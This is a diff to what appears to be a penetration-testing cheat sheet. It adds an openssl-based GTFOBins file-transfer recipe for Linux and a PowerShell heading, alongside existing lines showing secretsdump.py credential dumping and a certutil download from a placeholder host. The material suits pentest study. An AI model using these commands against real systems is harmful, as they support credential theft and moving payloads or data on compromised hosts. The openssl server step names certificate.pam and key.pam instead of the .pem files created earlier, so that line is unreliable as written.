@@ -365,6 +365,8 @@ secretsdump.py <domain>/<user>:<password>@<IP>
 
 ## File Transfers
 ### Windows File Transfers
+#### Powershell
+  
 #### LOLBAS
   
 ##### Bitsadmin from Powershell
@@ -381,10 +383,21 @@ certutil.exe -verifyctl -split -f http://<host>/<file>
 ```
 
 ### Linux File Transfers
-### GTFOBINS
-### Transferring Files with Code
-### Protected File Transfers
-### Catching Files over HTTP/S
+#### GTFOBINS
+##### openssl
+  1. Create a Certificate on the server machine
+  ```sh
+  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+  ```
+  2. Start the server to serve a file
+  ```sh
+  openssl s_server -quiet -accept <port> -cert certificate.pam -key key.pam < <file> 
+  ```
+  3. Download the File
+  ```sh
+  openssl s_client -connect <host>:<port> -quiet > <file>
+  ```
+  
 
 ### Pivoting
 ### 
